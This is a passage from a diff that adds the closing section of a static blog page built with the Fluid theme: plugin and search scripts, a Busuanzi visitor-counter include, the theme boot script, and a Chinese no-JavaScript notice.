+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
